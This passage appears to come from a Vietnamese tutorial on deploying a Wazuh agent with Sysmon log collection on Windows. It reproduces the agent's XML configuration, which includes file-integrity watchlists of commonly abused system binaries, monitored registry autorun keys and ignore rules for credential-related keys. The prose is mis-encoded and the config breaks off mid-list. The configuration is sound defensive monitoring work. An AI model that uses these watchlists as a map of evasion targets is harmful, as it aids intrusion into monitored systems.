\u0026lt;windows_apps\u0026gt;./shared/win_applications_rcl.txt\u0026lt;/windows_apps\u0026gt; \u0026lt;windows_malware\u0026gt;./shared/win_malware_rcl.txt\u0026lt;/windows_malware\u0026gt; \u0026lt;/rootcheck\u0026gt; \u0026lt;sca\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;interval\u0026gt;12h\u0026lt;/interval\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;/sca\u0026gt; \u0026lt;!-- File integrity monitoring --\u0026gt; \u0026lt;syscheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;!-- Frequency that syscheck is executed default every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;!-- Default files to be monitored. --\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;regedit.exe$|system.ini$|win.ini$\u0026#34;\u0026gt;%WINDIR%\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;at.exe$|attrib.exe$|cacls.exe$|cmd.exe$|eventcreate.exe$|ftp.exe$|lsass.exe$|net.exe$|net1.exe$|netsh.exe$|reg.exe$|regedt32.exe|regsvr32.exe|runas.exe|sc.exe|schtasks.exe|sethc.exe|subst.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34;\u0026gt;%WINDIR%\\SysNative\\drivers\\etc\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;WMIC.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\\wbem\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;powershell.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\\WindowsPowerShell\\v1.0\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;winrm.vbs$\u0026#34;\u0026gt;%WINDIR%\\SysNative\u0026lt;/directories\u0026gt; \u0026lt;!-- 32-bit programs. --\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;at.exe$|attrib.exe$|cacls.exe$|cmd.exe$|eventcreate.exe$|ftp.exe$|lsass.exe$|net.exe$|net1.exe$|netsh.exe$|reg.exe$|regedit.exe$|regedt32.exe$|regsvr32.exe$|runas.exe$|sc.exe$|schtasks.exe$|sethc.exe$|subst.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34;\u0026gt;%WINDIR%\\System32\\drivers\\etc\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;WMIC.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\\wbem\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;powershell.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\\WindowsPowerShell\\v1.0\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;winrm.vbs$\u0026#34;\u0026gt;%WINDIR%\\System32\u0026lt;/directories\u0026gt; \u0026lt;directories realtime=\u0026#34;yes\u0026#34;\u0026gt;%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026lt;/directories\u0026gt; \u0026lt;ignore\u0026gt;%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini\u0026lt;/ignore\u0026gt; \u0026lt;ignore type=\u0026#34;sregex\u0026#34;\u0026gt;.log$|.htm$|.jpg$|.png$|.chm$|.pnf$|.evtx$\u0026lt;/ignore\u0026gt; \u0026lt;!-- Windows registry entries to monitor. --\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\batfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\cmdfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\comfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\exefile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\piffile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\AllFilesystemObjects\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Directory\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Folder\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Protocols\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Policies\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Security\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Active Setup\\Installed Components\u0026lt;/windows_registry\u0026gt; \u0026lt;!-- Windows registry entries to ignore. --\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Security\\SAM\\Domains\\Account\\Users\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore type=\u0026#34;sregex\u0026#34;\u0026gt;\\Enum$\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\AppCs\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\DHCP\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSIn\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSOut\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\RPC-EPMap\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\Teredo\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\PolicyAgent\\Parameters\\Cache\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\ADOVMPPackage\\Final\u0026lt;/registry_ignore\u0026gt; \u0026lt;!-- Frequency for ACL checking (seconds) --\u0026gt; \u0026lt;windows_audit_interval\u0026gt;60\u0026lt;/windows_audit_interval\u0026gt; \u0026lt;!-- Nice value for Syscheck module --\u0026gt; \u0026lt;process_priority\u0026gt;10\u0026lt;/process_priority\u0026gt; \u0026lt;!-- Maximum output throughput --\u0026gt; \u0026lt;max_eps\u0026gt;100\u0026lt;/max_eps\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;interval\u0026gt;5m\u0026lt;/interval\u0026gt; \u0026lt;max_interval\u0026gt;1h\u0026lt;/max_interval\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/syscheck\u0026gt; \u0026lt;!-- System inventory --\u0026gt; \u0026lt;wodle name=\u0026#34;syscollector\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;interval\u0026gt;1h\u0026lt;/interval\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;hardware\u0026gt;yes\u0026lt;/hardware\u0026gt; \u0026lt;os\u0026gt;yes\u0026lt;/os\u0026gt; \u0026lt;network\u0026gt;yes\u0026lt;/network\u0026gt; \u0026lt;packages\u0026gt;yes\u0026lt;/packages\u0026gt; \u0026lt;ports all=\u0026#34;no\u0026#34;\u0026gt;yes\u0026lt;/ports\u0026gt; \u0026lt;processes\u0026gt;yes\u0026lt;/processes\u0026gt; \u0026lt;!-- Database synchronization settings --\u0026gt; \u0026lt;synchronization\u0026gt; \u0026lt;max_eps\u0026gt;10\u0026lt;/max_eps\u0026gt; \u0026lt;/synchronization\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- CIS policies evaluation --\u0026gt; \u0026lt;wodle name=\u0026#34;cis-cat\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;timeout\u0026gt;1800\u0026lt;/timeout\u0026gt; \u0026lt;interval\u0026gt;1d\u0026lt;/interval\u0026gt; \u0026lt;scan-on-start\u0026gt;yes\u0026lt;/scan-on-start\u0026gt; \u0026lt;java_path\u0026gt;\\\\server\\jre\\bin\\java.exe\u0026lt;/java_path\u0026gt; \u0026lt;ciscat_path\u0026gt;C:\\cis-cat\u0026lt;/ciscat_path\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- Osquery integration --\u0026gt; \u0026lt;wodle name=\u0026#34;osquery\u0026#34;\u0026gt; \u0026lt;disabled\u0026gt;yes\u0026lt;/disabled\u0026gt; \u0026lt;run_daemon\u0026gt;yes\u0026lt;/run_daemon\u0026gt; \u0026lt;bin_path\u0026gt;C:\\Program Files\\osquery\\osqueryd\u0026lt;/bin_path\u0026gt; \u0026lt;log_path\u0026gt;C:\\Program Files\\osquery\\log\\osqueryd.results.log\u0026lt;/log_path\u0026gt; \u0026lt;config_path\u0026gt;C:\\Program Files\\osquery\\osquery.conf\u0026lt;/config_path\u0026gt; \u0026lt;add_labels\u0026gt;yes\u0026lt;/add_labels\u0026gt; \u0026lt;/wodle\u0026gt; \u0026lt;!-- Active response --\u0026gt; \u0026lt;active-response\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;ca_store\u0026gt;wpk_root.pem\u0026lt;/ca_store\u0026gt; \u0026lt;ca_verification\u0026gt;yes\u0026lt;/ca_verification\u0026gt; \u0026lt;/active-response\u0026gt; \u0026lt;!-- Log analysis --\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-Sysmon/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Windows PowerShell\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-CodeIntegrity/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-TaskScheduler/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-PowerShell/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-Windows Firewall With Advanced Security/Firewall\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-Windows Defender/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;/agent_config\u0026gt; Kiá»ƒm tra láº¡i file cáº¥u hÃ¬nh á»Ÿ trÃªn, náº¿u cÃ³ pháº§n\n\u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Microsoft-Windows-Sysmon/Operational\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; thÃ¬ manager má»›i nháº­n Ä‘Æ°á»£c log tá»« Sysmon\nTiáº¿p theo, tÃ´i táº£i Wazuh-agent cho Windows tá»« trang chá»§ cá»§a Wazuh vÃ  cháº¡y nÃ³ vá»›i quyá»n Admin.\nSau khi cÃ i Ä‘áº·t xong, cÃ³ 1 thÆ° má»¥c tÃªn ossec-agent sáº½ xuáº¥t hiá»‡n trong Program Files (x86). File cáº¥u hÃ¬nh cá»§a agent sáº½ náº±m trong thÆ° má»¥c nÃ y cÃ³ tÃªn ossec.conf.\nTÃ´i sáº½ sá»­a Ä‘á»•i nÃ³ 1 chÃºt Ä‘á»ƒ cÃ³ thá»ƒ nháº­n IP cá»§a Wazuh-manager vÃ  chui vÃ o group OS-WINDOWS mÃ  tÃ´i vá»«a táº¡o phÃ­a trÃªn. Chá»‰ cáº§n thay Ä‘á»•i address cho Ä‘Ãºng vá»›i IP cá»§a manager.\n\u0026lt;!-- Wazuh - Agent - Default configuration for Windows More info at: https://documentation.wazuh.com Mailing list: https://groups.google.com/forum/#!forum/wazuh --\u0026gt; \u0026lt;ossec_config\u0026gt; \u0026lt;client\u0026gt; \u0026lt;server\u0026gt; \u0026lt;address\u0026gt;10.10.24.1\u0026lt;/address\u0026gt; \u0026lt;port\u0026gt;1514\u0026lt;/port\u0026gt; \u0026lt;protocol\u0026gt;tcp\u0026lt;/protocol\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;config-profile\u0026gt;windows, windows10\u0026lt;/config-profile\u0026gt; \u0026lt;crypto_method\u0026gt;aes\u0026lt;/crypto_method\u0026gt; \u0026lt;notify_time\u0026gt;10\u0026lt;/notify_time\u0026gt; \u0026lt;time-reconnect\u0026gt;60\u0026lt;/time-reconnect\u0026gt; \u0026lt;auto_restart\u0026gt;yes\u0026lt;/auto_restart\u0026gt; \u0026lt;enrollment\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;manager_address\u0026gt;10.10.24.1\u0026lt;/manager_address\u0026gt; \u0026lt;groups\u0026gt;OS-WINDOWS\u0026lt;/groups\u0026gt; \u0026lt;/enrollment\u0026gt; \u0026lt;/client\u0026gt; \u0026lt;!-- Agent buffer options --\u0026gt; \u0026lt;client_buffer\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;queue_size\u0026gt;5000\u0026lt;/queue_size\u0026gt; \u0026lt;events_per_second\u0026gt;500\u0026lt;/events_per_second\u0026gt; \u0026lt;/client_buffer\u0026gt; \u0026lt;!-- Log analysis --\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Application\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;Security\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;query\u0026gt;Event/System[EventID != 5145 and EventID != 5156 and EventID != 5447 and EventID != 4656 and EventID != 4658 and EventID != 4663 and EventID != 4660 and EventID != 4670 and EventID != 4690 and EventID != 4703 and EventID != 4907 and EventID != 5152 and EventID != 5157]\u0026lt;/query\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;System\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;eventchannel\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;localfile\u0026gt; \u0026lt;location\u0026gt;active-response\\active-responses.log\u0026lt;/location\u0026gt; \u0026lt;log_format\u0026gt;syslog\u0026lt;/log_format\u0026gt; \u0026lt;/localfile\u0026gt; \u0026lt;!-- Policy monitoring --\u0026gt; \u0026lt;rootcheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;windows_apps\u0026gt;./shared/win_applications_rcl.txt\u0026lt;/windows_apps\u0026gt; \u0026lt;windows_malware\u0026gt;./shared/win_malware_rcl.txt\u0026lt;/windows_malware\u0026gt; \u0026lt;/rootcheck\u0026gt; \u0026lt;!-- Security Configuration Assessment --\u0026gt; \u0026lt;sca\u0026gt; \u0026lt;enabled\u0026gt;yes\u0026lt;/enabled\u0026gt; \u0026lt;scan_on_start\u0026gt;yes\u0026lt;/scan_on_start\u0026gt; \u0026lt;interval\u0026gt;12h\u0026lt;/interval\u0026gt; \u0026lt;skip_nfs\u0026gt;yes\u0026lt;/skip_nfs\u0026gt; \u0026lt;/sca\u0026gt; \u0026lt;!-- File integrity monitoring --\u0026gt; \u0026lt;syscheck\u0026gt; \u0026lt;disabled\u0026gt;no\u0026lt;/disabled\u0026gt; \u0026lt;!-- Frequency that syscheck is executed default every 12 hours --\u0026gt; \u0026lt;frequency\u0026gt;43200\u0026lt;/frequency\u0026gt; \u0026lt;!-- Default files to be monitored. --\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;regedit.exe$|system.ini$|win.ini$\u0026#34;\u0026gt;%WINDIR%\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;at.exe$|attrib.exe$|cacls.exe$|cmd.exe$|eventcreate.exe$|ftp.exe$|lsass.exe$|net.exe$|net1.exe$|netsh.exe$|reg.exe$|regedt32.exe|regsvr32.exe|runas.exe|sc.exe|schtasks.exe|sethc.exe|subst.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34;\u0026gt;%WINDIR%\\SysNative\\drivers\\etc\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;WMIC.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\\wbem\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;powershell.exe$\u0026#34;\u0026gt;%WINDIR%\\SysNative\\WindowsPowerShell\\v1.0\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;winrm.vbs$\u0026#34;\u0026gt;%WINDIR%\\SysNative\u0026lt;/directories\u0026gt; \u0026lt;!-- 32-bit programs. --\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;at.exe$|attrib.exe$|cacls.exe$|cmd.exe$|eventcreate.exe$|ftp.exe$|lsass.exe$|net.exe$|net1.exe$|netsh.exe$|reg.exe$|regedit.exe$|regedt32.exe$|regsvr32.exe$|runas.exe$|sc.exe$|schtasks.exe$|sethc.exe$|subst.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34;\u0026gt;%WINDIR%\\System32\\drivers\\etc\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;WMIC.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\\wbem\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;powershell.exe$\u0026#34;\u0026gt;%WINDIR%\\System32\\WindowsPowerShell\\v1.0\u0026lt;/directories\u0026gt; \u0026lt;directories recursion_level=\u0026#34;0\u0026#34; restrict=\u0026#34;winrm.vbs$\u0026#34;\u0026gt;%WINDIR%\\System32\u0026lt;/directories\u0026gt; \u0026lt;directories realtime=\u0026#34;yes\u0026#34;\u0026gt;%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026lt;/directories\u0026gt; \u0026lt;ignore\u0026gt;%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini\u0026lt;/ignore\u0026gt; \u0026lt;ignore type=\u0026#34;sregex\u0026#34;\u0026gt;.log$|.htm$|.jpg$|.png$|.chm$|.pnf$|.evtx$\u0026lt;/ignore\u0026gt; \u0026lt;!-- Windows registry entries to monitor. --\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\batfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\cmdfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\comfile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\exefile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\piffile\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\AllFilesystemObjects\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Directory\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Folder\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Classes\\Protocols\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Policies\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Security\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\URL\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026lt;/windows_registry\u0026gt; \u0026lt;windows_registry arch=\u0026#34;both\u0026#34;\u0026gt;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Active Setup\\Installed Components\u0026lt;/windows_registry\u0026gt; \u0026lt;!-- Windows registry entries to ignore. --\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\Security\\SAM\\Domains\\Account\\Users\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore type=\u0026#34;sregex\u0026#34;\u0026gt;\\Enum$\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\AppCs\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\DHCP\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSIn\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\IPTLSOut\u0026lt;/registry_ignore\u0026gt; \u0026lt;registry_ignore\u0026gt;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MpsSvc\\Parameters\\PortKeywords\\RPC-EPMap\u0026lt;/registry_ignore\u0026gt; 